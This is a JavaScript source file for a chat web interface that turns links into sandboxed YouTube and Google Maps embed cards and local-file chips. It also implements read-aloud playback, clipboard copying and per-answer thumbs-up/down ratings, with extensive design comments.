// Claim `id` for a card, or refuse because this answer already has one.
// Unscoped renders (a tool result, an issue draft) claim freely: there is no
// answer to be a duplicate within.
function claimVideoCard(id) {
  if (!cardScope) return true;
  if (cardScope.has(id)) return false;
  cardScope.add(id);
  return true;
}

// Is this link a video THIS answer already shows a card for? Read after a
// refused embed, to choose a fallback that is not another copy of the picture.
function videoAlreadyCarded(url) {
  const yt = cardScope ? url.match(YOUTUBE_RE) : null;
  return !!yt && cardScope.has(yt[1] || yt[2]);
}
// [ONE-CARD-END]

// Returns an embed element for a whitelisted link, or null so the caller
// falls back to a normal <a>. `label` is used as accessible text/alt.
// `poster` (optional, from the [![img](src)](url) form) is a resolved image src
// shown INSTEAD of loading the frame immediately — see mapsCard.
function embedForLink(label, url, poster) {
  const yt = url.match(YOUTUBE_RE);
  if (yt) {
    const id = yt[1] || yt[2];
    return claimVideoCard(id) ? youtubeEmbed(id, label, poster) : null;
  }
  const maps = url.match(MAPS_RE);
  if (maps) {
    const params = new URLSearchParams(maps[1]);
    const saddr = params.get("saddr");
    const daddr = params.get("daddr");
    if (saddr && daddr) {
      return mapsDirectionsEmbed(saddr, daddr, label, poster);
    }
    // "q" is the classic ?q= link param; "query" is what the standard
    // /maps/search/?api=1&query=... share links use instead.
    const q = params.get("q") || params.get("query");
    if (q) {
      return mapsEmbed(encodeURIComponent(q), label, poster);
    }
    // No renderable query (e.g. only @lat,lng / view params) — plain link.
    return null;
  }
  return null;
}

// [FILE-LINK-START]
// A link to a file ON THIS MACHINE is not a link — it is the file, and it draws
// the way every other file in the transcript draws (#237).
//
// The gap this closes: aish drives the owner's signed-in portal, clicks
// "Pobierz e-fakturę", and the invoice lands in its downloads folder. The model
// could then say where it was and read it aloud, and that was all — the owner
// had a path in a sentence and no way to touch the document aish had just
// fetched for him. `/download` would have served it the whole time; nothing in
// an ANSWER could ask.
//
// It goes through `embedForLink` because that is already the seam for "this
// link is really something else": a YouTube URL becomes a player, a Maps URL
// becomes a map, and an absolute local path becomes the file. And it hands off
// to `attachmentChip`, so there is ONE answer to what a file looks like and
// what tapping it does — a PDF opens onto its pages, anything else saves.
//
// A file EXTENSION is required, so a site-relative link the model wrote by hand
// (`[the docs](/help)`) stays an anchor rather than becoming a chip for a file
// that does not exist. Both were broken before; only one of them is a file.
const LOCAL_FILE_RE = /^\/[^\n]*\.[A-Za-z0-9]{1,8}$/;

function fileChip(label, url) {
  if (!LOCAL_FILE_RE.test(url)) return null;
  const name = url.split("/").pop() || url;
  // An image is a picture, not a chip — the same call `attachmentNode` makes.
  // Written as an ordinary link by a model that had a path and no picture, it
  // still shows the picture.
  if (ATTACH_IMAGE_RE.test(name) && imageSrc(url)) return inlineImage(label || name, url);
  const chip = attachmentChip({ kind: kindOfFile(name), name, path: url });
  chip.classList.add("md-file-chip");
  return chip;
}
// [FILE-LINK-END]

// How long the player gets before the card admits nothing is happening.
//
// This is the WEAK net, and knowing why matters: a cross-origin frame cannot be
// asked whether it worked, and `load` is not the answer either — measured in
// Chrome, an iframe pointed at a blocked or unreachable host fires `load`
// exactly as a working one does, having painted its own error page. So this
// catches only true silence (a request left hanging), never the black box. What
// catches that is `cannotReachYouTube` below: the app's OWN offline authority,
// a fact aish already holds, instead of an interrogation the frame cannot
// answer. Generous on purpose — being early yanks a player that was merely slow.
const EMBED_FRAME_SLOW_MS = 8000;

// A player cannot possibly load when our own server is unreachable over the
// same radio (`offlineMode` is the socket's verdict, not navigator.onLine's —
// see the connectivity block). navigator.onLine only ever ACCELERATES the
// conclusion, which is the same weighting the rest of the file gives it.
function cannotReachYouTube() {
  return offlineMode || (typeof navigator !== "undefined" && navigator.onLine === false);
}

// [EMBED-HANDOFF-START]
// What a tap on an embed card LOOKS like while the frame is on its way.
//
// The tap swapped our badge for a third-party frame that takes a moment to
// paint, and in that moment the card said nothing — the picture either sat
// there unchanged (video) or was replaced by an empty box (maps, which threw
// its poster away). Reported from the phone as "I have to click twice", and
// for the video that is literally true: the player arrives PAUSED on iOS
// whatever `autoplay=1` asks for, because the gesture does not cross into a
// newly created cross-origin frame, so the real play button is YouTube's own
// and it is the second tap. A first tap with no legible result reads as a tap
// that never registered, which is the same law the pending-send bubble is
// built on (L6/L7): the change under the thumb has to be visible, and the
// screen must say what it is waiting for.
//
// So: our badge goes away AT ONCE, a spinner with words takes its place over
// the still, and it clears when the frame loads — leaving the player's own
// controls as the only thing to press. It does not pretend to be playback.
// How long the acknowledgement stays up at minimum. Measured in Chrome on a
// good connection: the frame's `load` lands ~300–450 ms after the tap, so
// clearing strictly on load can flash the spinner for a third of a second —
// long enough to be a flicker, too short to be read as "your tap registered",
// which is the one job it has. Held for at least this long instead.
const EMBED_HANDOFF_MIN_MS = 400;

function embedLoadingOverlay(text) {
  const overlay = document.createElement("div");
  overlay.className = "embed-loading";
  const ring = document.createElement("div");
  ring.className = "spin";
  const label = document.createElement("span");
  label.textContent = text;
  overlay.appendChild(ring);
  overlay.appendChild(label);
  return overlay;
}

// Take the acknowledgement down, honouring the floor above. `shown` is when it
// went up; a load inside the window defers the removal rather than cancelling
// it, so the sequence is always tap → visible wait → player, never a blink.
function clearEmbedLoading(overlay, shown) {
  if (!overlay) return;
  const left = EMBED_HANDOFF_MIN_MS - (embedNow() - shown);
  if (left <= 0) {
    overlay.remove();
    return;
  }
  setTimeout(() => overlay.remove(), left);
}

// Date.now() via a seam: the choreography checks run these functions in a vm
// with timers as data, and a real clock there makes the floor untestable.
function embedNow() {
  return Date.now();
}
// [EMBED-HANDOFF-END]

// `poster` (optional) is an already-resolved image src for this video's still,
// normally the local copy `show_image` stored. It BEATS YouTube's own thumbnail
// because it is same-origin, already fetched, and inside the offline mirror —
// `i.ytimg.com` is in none of those, so a chat read on a plane showed a black
// card where the picture had been.
function youtubeEmbed(id, label, poster) {
  const watchUrl = `https://www.youtube.com/watch?v=${id}`;
  const card = document.createElement("div");
  card.className = "embed embed-youtube";
  card.setAttribute("role", "button");
  card.tabIndex = 0;
  card.setAttribute("aria-label", `Play video: ${label}`);

  const img = document.createElement("img");
  img.className = "embed-thumb";
  img.loading = "lazy";
  img.alt = label;
  img.src = poster || `https://img.youtube.com/vi/${id}/hqdefault.jpg`;
  card.appendChild(img);

  const play = document.createElement("div");
  play.className = "embed-play";
  play.innerHTML = YT_PLAY_SVG;
  card.appendChild(play);

  let frame = null;
  let watchdog = 0;
  let stalled = null;
  let loading = null;
  let shown = 0;

  // The still is NOT thrown away when the player opens (it used to be — the
  // frame replaced every child), so there is something behind the frame when
  // the frame turns out to be nothing. CSS lays the active frame over it.
  const activate = () => {
    if (frame) return; // already playing; a second tap must not restack it
    if (stalled) { stalled.remove(); stalled = null; }
    // Don't open a frame that cannot load: an iframe over the still paints its
    // own blank error page, which is the black box — and it fires `load`, so
    // nothing downstream would ever notice. Say it instead, and keep the still.
    if (cannotReachYouTube()) {
      stall("Offline");
      return;
    }
    frame = document.createElement("iframe");
    frame.className = "embed-frame";
    // playsinline is for iOS, where a play WITHOUT it hands the video to the
    // native fullscreen player — leaving the chat entirely for a tap that was
    // meant to start a video in place. autoplay is still asked for (desktop
    // honours it, which is where one tap really is one tap) but never relied
    // on: see [EMBED-HANDOFF] for why the second tap exists on the phone.
    frame.src = `https://www.youtube-nocookie.com/embed/${id}?autoplay=1&playsinline=1`;
    frame.title = label;
    frame.allow = "autoplay; encrypted-media; picture-in-picture; fullscreen";
    frame.allowFullscreen = true;
    // Origin only, never the path: YouTube authorizes embedding by referrer,
    // so no-referrer trips "error 153". strict-origin sends just the scheme+
    // host (e.g. https://aish.example) — enough to authorize, while the aish
    // path/session in the URL is withheld.
    frame.referrerPolicy = "strict-origin-when-cross-origin";
    // The player only bootstraps with allow-same-origin (it reads its own
    // youtube-nocookie.com storage). That is safe here BECAUSE the frame is
    // cross-origin to aish: allow-same-origin grants it YouTube's origin, not
    // aish's, so it still can't touch aish's DOM/cookies. The "allow-scripts +
    // allow-same-origin lets a frame drop its own sandbox" escape only matters
    // when the framed content is same-origin AS THE PARENT — it isn't here.
    frame.setAttribute("sandbox", "allow-scripts allow-same-origin allow-presentation");
    frame.addEventListener("load", () => {
      clearTimeout(watchdog);
      watchdog = 0;
      // The player is here: our overlay goes, so the only control on the card
      // is YouTube's own and there are never two play buttons to choose from.
      clearEmbedLoading(loading, shown);
      loading = null;
    });
    watchdog = setTimeout(() => stall(), EMBED_FRAME_SLOW_MS);
    play.remove();
    loading = embedLoadingOverlay("Loading player…");
    shown = embedNow();
    card.appendChild(loading);
    card.appendChild(frame);
    card.classList.add("embed-active");
    card.removeAttribute("role");
    card.removeAttribute("tabindex");
  };

  // The player is not going to happen: L7 — a screen that cannot show the truth
  // says so. Back to the still (which is why it was kept), with the one thing
  // that still works from here, and tappable again because the next attempt may
  // succeed — the connection this failed on is usually the thing that changes.
  const stall = (reason) => {
    watchdog = 0;
    if (frame) { frame.remove(); frame = null; }
    if (loading) { loading.remove(); loading = null; }
    card.classList.remove("embed-active");
    card.appendChild(play);
    card.setAttribute("role", "button");
    card.tabIndex = 0;
    stalled = document.createElement("div");
    stalled.className = "embed-stalled";
    const note = document.createElement("span");
    note.textContent = reason || "Couldn’t play here";
    const out = externalAnchor(watchUrl);
    out.textContent = "Open on YouTube";
    // Or the tap bubbles to the card and re-arms the player under the new tab.
    out.addEventListener("click", (e) => e.stopPropagation());
    stalled.appendChild(note);
    stalled.appendChild(out);
    card.appendChild(stalled);
  };

  card.addEventListener("click", activate);
  card.addEventListener("keydown", (e) => {
    if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      activate();
    }
  });
  return card;
}

const MAP_OPEN_SVG =
  '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2a7 7 0 0 0-7 7c0 5 7 13 7 13s7-8 7-13a7 7 0 0 0-7-7z" fill="currentColor"/><circle cx="12" cy="9" r="2.6" fill="var(--bg-elev2)"/></svg>';

// One map card, with or without a poster.
//
// WITHOUT a poster the frame loads immediately (the pre-existing behaviour for
// a bare maps link). WITH one — the [![static map](…)](maps link) form — the
// picture the tool already produced is painted instead, and the live frame is
// built on tap. That is not only cosmetic: the poster is same-origin and
// already stored, so it is what remains visible when the frame cannot load at
// all (offline, or Google blocked), where an eager iframe leaves a black box.
// Same interaction as the YouTube card above.
function mapsCard(frameSrc, label, poster) {
  const card = document.createElement("div");
  card.className = "embed embed-maps";
  const buildFrame = () => {
    const frame = document.createElement("iframe");
    frame.className = "embed-frame";
    frame.src = frameSrc;
    frame.title = label;
    frame.loading = "lazy";
    frame.referrerPolicy = "no-referrer";
    frame.allowFullscreen = true;
    // Same sandbox level as the YouTube embed above: allow-same-origin is safe
    // here BECAUSE maps.google.com is cross-origin to aish, so it grants Maps
    // its own origin (needed to bootstrap its "View larger map"/Directions UI)
    // without any ability to reach aish's origin. allow-popups-to-escape-sandbox
    // keeps the tab those buttons open from inheriting this sandbox; allow-forms
    // lets Maps' own search/route boxes submit.
    frame.setAttribute(
      "sandbox",
      "allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox allow-forms"
    );
    return frame;
  };

  if (!poster) {
    card.appendChild(buildFrame());
    return card;
  }

  card.classList.add("embed-poster");
  card.setAttribute("role", "button");
  card.tabIndex = 0;
  card.setAttribute("aria-label", `Open the interactive map: ${label}`);
  const img = document.createElement("img");
  img.className = "embed-thumb";
  img.loading = "lazy";
  img.alt = label;
  img.src = poster;
  card.appendChild(img);
  const badge = document.createElement("div");
  badge.className = "embed-play embed-open";
  badge.innerHTML = MAP_OPEN_SVG;
  card.appendChild(badge);

  let frame = null;
  let loading = null;
  let shown = 0;

  const activate = () => {
    if (frame) return; // the live map is already up
    // The poster STAYS, exactly as the video card's still does: replacing every
    // child meant the tap made the picture vanish and left an empty box for as
    // long as Google took to answer — which is the other half of "I have to
    // click twice" (a map that looks the same once loaded gives a tap no
    // legible result at all). The frame lands over it; see [EMBED-HANDOFF].
    frame = buildFrame();
    frame.addEventListener("load", () => {
      clearEmbedLoading(loading, shown);
      loading = null;
    });
    badge.remove();
    loading = embedLoadingOverlay("Opening live map…");
    shown = embedNow();
    card.appendChild(loading);
    card.appendChild(frame);
    card.classList.add("embed-active");
    card.classList.remove("embed-poster");
    card.removeAttribute("role");
    card.removeAttribute("tabindex");
    card.removeAttribute("aria-label");
  };
  card.addEventListener("click", activate);
  card.addEventListener("keydown", (e) => {
    if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      activate();
    }
  });
  return card;
}

function mapsEmbed(query, label, poster) {
  return mapsCard(`https://maps.google.com/maps?q=${query}&output=embed`, label, poster);
}

function mapsDirectionsEmbed(saddr, daddr, label, poster) {
  const src =
    `https://maps.google.com/maps?saddr=${encodeURIComponent(saddr)}` +
    `&daddr=${encodeURIComponent(daddr)}&output=embed`;
  return mapsCard(src, label, poster);
}

// [![alt](image)](url) — an image that is ALSO a link. Deliberately kept out of
// INLINE_RE: its plain-link branch would read a remote-hosted poster as a link
// labelled "![alt", and adding a branch there would renumber ten capture groups
// the whole renderer indexes by hand. inlineMd tries this first at each
// position instead.
const IMAGE_LINK_RE = /\[!\[([^\]\n]*)\]\(([^)\s]+)\)\]\((https?:\/\/[^)\s]+)\)/;

// An embeddable target becomes a poster-backed card; anything else stays a
// perfectly ordinary clickable picture.
function imageLink(alt, imageTarget, url) {
  const poster = imageSrc(imageTarget);
  if (poster !== null) {
    const embed = embedForLink(alt, url, poster);
    if (embed) return embed;
  }
  const link = externalAnchor(url);
  link.className = "img-link";
  // Refused because this answer already cards that video ([ONE-CARD]): the
  // picture is on screen inside that card, so painting it again here is the
  // duplicate being avoided. The words become a plain link to the same video.
  if (videoAlreadyCarded(url)) {
    link.textContent = alt || url;
    return link;
  }
  if (poster === null) {
    link.textContent = alt || url;
    return link;
  }
  const live = !replaying && !offlineViewing;
  link.appendChild(
    markdownImg(alt, poster, imageTarget, live, () => {
      link.textContent = `🖼 ${alt || url} (unavailable)`;
      link.classList.add("img-broken");
    })
  );
  return link;
}

function inlineMd(text) {
  const frag = document.createDocumentFragment();
  // [no-chips] (#46) is the model's opt-out from the quick-reply safety net —
  // a directive, not content, so it never renders (code blocks skip inlineMd
  // and keep it literal). Stripping here covers streaming, replay, and reload.
  let rest = text.replace(/\[no-chips\]/gi, "");
  while (rest) {
    const inline = rest.match(INLINE_RE);
    const imageLinkMatch = rest.match(IMAGE_LINK_RE);
    // A tie goes to the image-link: starting at the same index it is the more
    // specific reading, and INLINE_RE would otherwise tear it into three nodes.
    const nested =
      imageLinkMatch && (!inline || imageLinkMatch.index <= inline.index);
    const match = nested ? imageLinkMatch : inline;
    if (!match) {
      frag.appendChild(document.createTextNode(rest));
      break;
    }
    if (match.index > 0) {
      frag.appendChild(document.createTextNode(rest.slice(0, match.index)));
    }
    if (nested) {
      frag.appendChild(imageLink(match[1], match[2], match[3]));
    } else if (match[1]) {
      const code = document.createElement("code");
      code.textContent = match[1].slice(1, -1);
      frag.appendChild(code);
    } else if (match[2]) {
      const strong = document.createElement("strong");
      strong.appendChild(inlineMd(match[2].slice(2, -2)));
      frag.appendChild(strong);
    } else if (match[3]) {
      const em = document.createElement("em");
      em.appendChild(inlineMd(match[3].slice(1, -1)));
      frag.appendChild(em);
    } else if (match[4]) {
      const del = document.createElement("del");
      del.appendChild(inlineMd(match[4].slice(2, -2)));
      frag.appendChild(del);
    } else if (match[7] !== undefined) {
      frag.appendChild(quickReplyChip(match[7], match[8]));
    } else if (match[10] !== undefined) {
      frag.appendChild(inlineImage(match[9], match[10]));
    } else if (match[12] !== undefined) {
      // Not a file after all (a site-relative link the model wrote by hand):
      // leave the source visible rather than render an anchor that 404s on our
      // own origin, which is what it did before.
      frag.appendChild(fileChip(match[11], match[12])
                       || document.createTextNode(match[0]));
    } else {
      const embed = embedForLink(match[5], match[6]);
      if (embed) {
        frag.appendChild(embed);
      } else {
        const link = externalAnchor(match[6]);
        link.appendChild(inlineMd(match[5]));
        frag.appendChild(link);
      }
    }
    rest = rest.slice(match.index + match[0].length);
  }
  return frag;
}

// ---- read aloud (Web Speech API) -----------------------------------------
// Native speechSynthesis: offline, no audio-generation API, and iOS allows
// it because speak() runs inside the button's tap gesture. Answers are
// spoken as a queue of paragraph-sized chunks (the API can't seek, so
// chunking is what makes prev/next skip possible — and it sidesteps
// Chrome's stall on long utterances). One player is active at a time; its
// speaker button expands into prev / pause / next / speed / stop controls.
const TTS_OK = "speechSynthesis" in window && "SpeechSynthesisUtterance" in window;

const TTS_RATES = [0.8, 1, 1.2, 1.4, 1.6, 1.8, 2];
const TTS_RATE_KEY = "aish-tts-rate"; // device-local, like the wrap toggle
let ttsRate = parseFloat(localStorage.getItem(TTS_RATE_KEY));
if (!TTS_RATES.includes(ttsRate)) ttsRate = 1;

const player = {
  box: null,      // the active answer's .tts container
  chunks: [],
  index: 0,
  lang: "en-US",
  paused: false,
  seq: 0,         // bumped on every cancel/skip so stale onend callbacks no-op
  utterance: null, // held so WebKit can't GC it mid-speech (kills onend)
};

// Listening to an answer is passive, so the phone's idle timer sleeps the
// screen mid-playback (#96). Hold a Screen Wake Lock while TTS is speaking.
let wakeLock = null;

async function acquireWakeLock() {
  if (!("wakeLock" in navigator) || wakeLock) return;
  try {
    wakeLock = await navigator.wakeLock.request("screen");
    wakeLock.addEventListener("release", () => { wakeLock = null; });
  } catch (err) {
    console.warn(`wake lock request failed: ${err.name}`);
  }
}

function releaseWakeLock() {
  const held = wakeLock;
  wakeLock = null; // clear first so a re-acquire can't race the async release
  if (held) held.release().catch(() => {});
}

// iOS drops the wake lock whenever the page is hidden (screen off, app
// switch). Re-take it on return if we're still mid-answer.
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible" && player.box && !player.paused) {
    acquireWakeLock();
  }
});

function svgIcon(cls, build) {
  const NS = "http://www.w3.org/2000/svg";
  const make = (tag, attrs) => {
    const node = document.createElementNS(NS, tag);
    for (const [key, value] of Object.entries(attrs)) node.setAttribute(key, value);
    return node;
  };
  const svg = make("svg", { viewBox: "0 0 24 24", class: cls });
  build(make, svg);
  return svg;
}

function speakerIcon() {
  return svgIcon("i-speak", (make, svg) => {
    const g = make("g", { fill: "none", stroke: "currentColor", "stroke-width": "1.7",
      "stroke-linecap": "round", "stroke-linejoin": "round" });
    g.appendChild(make("path", {
      d: "M11.5 5.5 7.4 9H4.8a.8.8 0 0 0-.8.8v4.4a.8.8 0 0 0 .8.8h2.6l4.1 3.5z",
    }));
    g.appendChild(make("path", { d: "M15 9.3a4 4 0 0 1 0 5.4" }));
    g.appendChild(make("path", { d: "M17.6 6.8a7.6 7.6 0 0 1 0 10.4" }));
    svg.appendChild(g);
  });
}

function trashIcon() {
  return svgIcon("i-trash", (make, svg) => {
    const g = make("g", { fill: "none", stroke: "currentColor", "stroke-width": "1.7",
      "stroke-linecap": "round", "stroke-linejoin": "round" });
    g.appendChild(make("path", { d: "M4.5 6.5h15" }));
    g.appendChild(make("path", { d: "M9.5 6.5V5a1.5 1.5 0 0 1 1.5-1.5h2A1.5 1.5 0 0 1 14.5 5v1.5" }));
    g.appendChild(make("path", { d: "M6.5 6.5 7.4 19a1.5 1.5 0 0 0 1.5 1.4h6.2a1.5 1.5 0 0 0 1.5-1.4l.9-12.5" }));
    g.appendChild(make("path", { d: "M10.5 10v6.5M13.5 10v6.5" }));
    svg.appendChild(g);
  });
}

function pencilIcon() {
  return svgIcon("i-pencil", (make, svg) => {
    const g = make("g", { fill: "none", stroke: "currentColor", "stroke-width": "1.7",
      "stroke-linecap": "round", "stroke-linejoin": "round" });
    g.appendChild(make("path", { d: "M4.5 19.5h3.6L19.4 8.2a2 2 0 0 0-2.9-2.9L5.2 16.6z" }));
    g.appendChild(make("path", { d: "M13.8 7l3.2 3.2" }));
    svg.appendChild(g);
  });
}

function pauseIcon() {
  return svgIcon("i-pause", (make, svg) => {
    svg.appendChild(make("rect", { x: "7", y: "6", width: "3.4", height: "12", rx: "1.4", fill: "currentColor" }));
    svg.appendChild(make("rect", { x: "13.6", y: "6", width: "3.4", height: "12", rx: "1.4", fill: "currentColor" }));
  });
}

function playIcon() {
  return svgIcon("i-play", (make, svg) => {
    svg.appendChild(make("path", {
      d: "M8.6 6.3v11.4a.7.7 0 0 0 1.07.6l8.9-5.7a.7.7 0 0 0 0-1.2l-8.9-5.7a.7.7 0 0 0-1.07.6z",
      fill: "currentColor",
    }));
  });
}

function skipSvg(forward) {
  return svgIcon(forward ? "" : "", (make, svg) => {
    if (forward) {
      svg.appendChild(make("path", {
        d: "M6.5 7.4v9.2a.7.7 0 0 0 1.08.59l7.2-4.6a.7.7 0 0 0 0-1.18l-7.2-4.6A.7.7 0 0 0 6.5 7.4z",
        fill: "currentColor",
      }));
      svg.appendChild(make("rect", { x: "16.2", y: "6.6", width: "1.9", height: "10.8", rx: ".95", fill: "currentColor" }));
    } else {
      svg.appendChild(make("path", {
        d: "M17.5 7.4v9.2a.7.7 0 0 1-1.08.59l-7.2-4.6a.7.7 0 0 1 0-1.18l7.2-4.6a.7.7 0 0 1 1.08.59z",
        fill: "currentColor",
      }));
      svg.appendChild(make("rect", { x: "5.9", y: "6.6", width: "1.9", height: "10.8", rx: ".95", fill: "currentColor" }));
    }
  });
}

function xIcon() {
  return svgIcon("", (make, svg) => {
    svg.appendChild(make("path", { d: "M7.5 7.5l9 9M16.5 7.5l-9 9", fill: "none",
      stroke: "currentColor", "stroke-width": "2", "stroke-linecap": "round" }));
  });
}

// ---- copy to clipboard ---------------------------------------------------
function copyIcon() {
  return svgIcon("i-copy", (make, svg) => {
    const g = make("g", { fill: "none", stroke: "currentColor", "stroke-width": "1.7",
      "stroke-linecap": "round", "stroke-linejoin": "round" });
    g.appendChild(make("rect", { x: "8.6", y: "8.6", width: "10.6", height: "10.6", rx: "2.4" }));
    g.appendChild(make("path", { d: "M5.4 15.4h-.6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h7.4a2 2 0 0 1 2 2v.6" }));
    svg.appendChild(g);
  });
}

function checkIcon() {
  return svgIcon("i-check", (make, svg) => {
    svg.appendChild(make("path", { d: "M5 12.8l4.4 4.4 9.4-10", fill: "none",
      stroke: "currentColor", "stroke-width": "2", "stroke-linecap": "round",
      "stroke-linejoin": "round" }));
  });
}

async function copyText(text) {
  // navigator.clipboard exists only in secure contexts; aish-web is often
  // plain http on the LAN, so fall back to the execCommand-on-a-textarea
  // trick (readonly keeps the iOS keyboard from flashing open).
  if (navigator.clipboard && window.isSecureContext) {
    try {
      await navigator.clipboard.writeText(text);
      return true;
    } catch { /* permission hiccup — try the fallback */ }
  }
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.setAttribute("readonly", "");
  ta.style.position = "fixed";
  ta.style.top = "0";
  ta.style.opacity = "0";
  document.body.appendChild(ta);
  ta.focus({ preventScroll: true });
  ta.select();
  ta.setSelectionRange(0, text.length);
  let ok = false;
  try { ok = document.execCommand("copy"); } catch { ok = false; }
  ta.remove();
  return ok;
}

// [RATING]
// 👍/👎 on an answer, with an optional reason (#207). Two properties matter and
// both are deliberate:
//
//   The tap records IMMEDIATELY. A rating that waits for a comment is a rating
//   that mostly does not happen, and the count is the part the rules engine
//   needs — it is how "is he still correcting turns that passed every rule"
//   gets answered at all. The comment box opens after, and sending it writes a
//   second record for the same turn; the ledger takes the last.
//
//   Nothing here acts on the rating. It is evidence for the weekly pass and for
//   the owner — making it steer the running session would turn a feedback
//   control into a lever the model can be pointed at.
// What was typed for a turn, kept for THIS browser session only. Switching
// thumb, or withdrawing and changing your mind, must not cost you the sentence
// you already wrote — but a comment with no verdict attached is not a rating,
// so it is never written to the log until a thumb is on. Memory, not storage.
const ratingDrafts = new Map();

function ratingDraft(turn, el) {
  if (ratingDrafts.has(turn)) return ratingDrafts.get(turn);
  const said = el && el.querySelector(".rating-said");
  return said ? said.textContent : "";
}

function ratingChip(turn, kind) {
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = `rating-chip rating-${kind}`;
  const label = kind === "up" ? "good answer" : "bad answer";
  btn.title = label;
  btn.setAttribute("aria-label", label);
  btn.append(thumbIcon(kind));
  // Do not steal focus from an open reason box. Without this the tap blurs the
  // field first, blur commits and removes it, the row loses ~20px of height,
  // and the thumb the finger was aimed at has MOVED by the time the click
  // lands — so the first tap appears to do nothing but close the box. Toolbar
  // controls beside a text field conventionally decline focus for exactly this
  // reason. The commit still happens, below, in an order we choose.
  btn.onmousedown = (e) => e.preventDefault();
  btn.onclick = () => {
    // Commit anything typed BEFORE acting, so the reason belongs to the
    // verdict it was written under and the draft is up to date for a switch.
    commitOpenReason(ratingHost(btn));
    // Tapping the lit thumb withdraws it. An opinion you cannot take back is
    // one you hesitate to give, and the count this feeds is only worth having
    // if a mistap is cheap to undo. Withdrawal is a RECORD like any other —
    // `none` written after `down` — never a deletion, so the log stays
    // append-only and the ledger's last-wins already does the right thing.
    const host = ratingHost(btn);
    const draft = ratingDraft(turn, host);
    const previous = currentRating(turn); // to put back if the verdict never lands
    const next = btn.classList.contains("on") ? "none" : kind;
    if (next === "none") {
      // The words stay in memory — changing your mind back should not cost
      // you the sentence — but they are NOT written, because a comment with
      // no verdict attached is not a rating.
      act({ type: "rate", turn, rating: next },
        { label: "clearing that rating", lost: () => markRating(turn, previous) });
      markRating(turn, next);
      closeRatingComment(btn);
      showRatingComment(host, "");
    } else {
      // Selecting, or switching thumb. The reason carries over so the record
      // stays coherent — the latest one is always verdict + reason together —
      // and the box opens pre-filled so it can be edited to match.
      act({ type: "rate", turn, rating: kind, ...(draft ? { comment: draft } : {}) },
        { label: "that rating", lost: () => markRating(turn, previous) });
      markRating(turn, kind, draft);
      openRatingComment(btn, turn, kind, draft);
    }
  };
  return btn;
}

// One drawing, used both ways: thumbs-down is the same hand rotated half a
// turn about the icon's centre. Two hand-drawn paths would drift apart the
// first time either is nudged, and these two must read as exact opposites.
function thumbIcon(kind) {
  return svgIcon(`i-thumb i-thumb-${kind}`, (make, svg) => {
    const g = make("g", {
      fill: "none", stroke: "currentColor", "stroke-width": "1.7",
      "stroke-linecap": "round", "stroke-linejoin": "round",
      ...(kind === "down" ? { transform: "rotate(180 12 12)" } : {}),
    });
    // The cuff, and the hand: thumb up the left edge, four knuckles across.
    g.appendChild(make("rect", { x: "3", y: "11.2", width: "4", height: "9", rx: "1.2" }));
    g.appendChild(make("path", {
      d: "M7 20.2v-9l4.1-8a2 2 0 0 1 1.9 2.7l-1 4.1h5.2a2.1 2.1 0 0 1 2 2.6l-1.2 5.4"
         + "a2.2 2.2 0 0 1-2.1 1.7H7z",
    }));
    svg.appendChild(g);
  });
}

// The box goes on its OWN row, under the tools — not inside them. In the chip
// row it was a flex item competing with eight 40px controls, so on a phone it
// collapsed to nothing: the keyboard opened onto a field with no width, which
// reads exactly like a broken button.
// Commit an open reason box without waiting for blur, so a tap on another
// control performs its own action AND saves what was typed.
function commitOpenReason(host) {
  const note = host && host.querySelector(".rating-note");
  if (note && note.commitReason) note.commitReason();
}

function ratingHost(btn) {
  const tools = btn.parentElement;
  return (tools && tools.parentElement) || tools;
}

function closeRatingComment(btn) {
  const host = ratingHost(btn);
  const note = host && host.querySelector(".rating-note");
  if (note) note.remove();
}

function openRatingComment(btn, turn, kind, existing) {
  const host = ratingHost(btn);
  if (!host || host.querySelector(".rating-note")) return;
  const note = document.createElement("input");
  if (existing) note.value = existing;
  note.type = "text";
  note.className = "rating-note";
  note.placeholder = kind === "up" ? "what worked? (optional)" : "what was wrong? (optional)";
  // COMMITTED ON THE WAY OUT, however you leave — Return, tapping elsewhere,
  // dismissing the keyboard. Blur used to keep the text and send nothing, so a
  // comment typed and then tapped away from was silently discarded: the log
  // recorded the tap with `comment: ""` and the owner, reasonably, reported
  // that his comment had vanished. On a phone, tapping away IS how you finish
  // typing — especially now that the box scrolls itself to mid-screen, well
  // away from the keyboard's return key.
  let committed = false;
  const commit = () => {
    if (committed) return;
    committed = true;
    stopKeepingInView();
    const comment = note.value.trim();
    // Remembered either way, so withdrawing and reselecting restores it.
    if (comment) ratingDrafts.set(turn, comment);
    else ratingDrafts.delete(turn);
    if (comment) act({ type: "rate", turn, rating: kind, comment }, { label: "that reason" });
    note.remove();
    showRatingComment(ratingHost(btn), comment);
  };
  note.commitReason = commit;   // so another control can commit it deliberately
  note.onkeydown = (e) => {
    if (e.key !== "Enter") return;
    e.preventDefault();
    commit();
  };
  note.onblur = commit;
  host.appendChild(note);

  // Focusing is not enough on a phone. The keyboard opens AFTER focus, and
  // `syncKeyboardInset` then clamps the body to the visible strip — so a note
  // that was on screen when tapped ends up under the keyboard, with nothing
  // scrolling it back. That is the whole of "I tap the thumb, the keyboard
  // opens, and there is nowhere to type": the field exists, at full width,
  // just below the fold.
  //
  // So it is scrolled into view now AND again on each viewport change while it
  // holds focus, because the keyboard arrives, animates, and settles over
  // several events rather than one.
  const keepInView = () => note.scrollIntoView({ block: "center" });
  const stopKeepingInView = () => {
    if (!window.visualViewport) return;
    visualViewport.removeEventListener("resize", keepInView);
    visualViewport.removeEventListener("scroll", keepInView);
  };
  if (window.visualViewport) {
    visualViewport.addEventListener("resize", keepInView);
    visualViewport.addEventListener("scroll", keepInView);
  }
  note.focus();
  keepInView();
}

// Applied by turn id rather than by position: a rating can be written long
// after the turn it names, and on replay they all arrive at the end.
// What this device last PAINTED for a turn, remembered by the one function
// that paints it — so reverting an unreceipted verdict ([ACK-LEDGER]) does not
// have to read the answer back out of class names, which is a second authority
// on the same fact and drifts the first time the markup is nudged.
const ratingNow = new Map(); // turn -> "up" | "down" | "none"

function currentRating(turn) {
  return ratingNow.get(turn) || "none";
}

function markRating(turn, kind, comment) {
  ratingNow.set(turn, kind);
